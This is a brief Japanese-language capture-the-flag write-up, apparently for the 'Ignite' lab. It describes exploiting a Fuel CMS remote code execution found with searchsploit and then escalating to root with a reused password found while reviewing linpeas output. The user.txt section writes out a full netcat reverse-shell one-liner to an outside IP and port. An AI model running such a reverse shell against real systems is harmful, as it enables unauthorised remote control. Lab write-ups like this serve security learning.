---
title: "Ignite"
date: 2024-03-16T11:39:35+09:00
draft: false
---

### user.txt

- searchsploit fuel CMS
  - RCE
  - URL とプロキシを設定しなおす必要アリ
  - ```rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.18.127.137 1234 > /tmp/f```
- ```find / 2>/dev/null | grep flag.txt```

### root.txt

- sudo , crontab, linpeas も特になし
  - 細かく linpeas を見ていく
- password -> mememe みたいなのがある
- su で使えてしまう
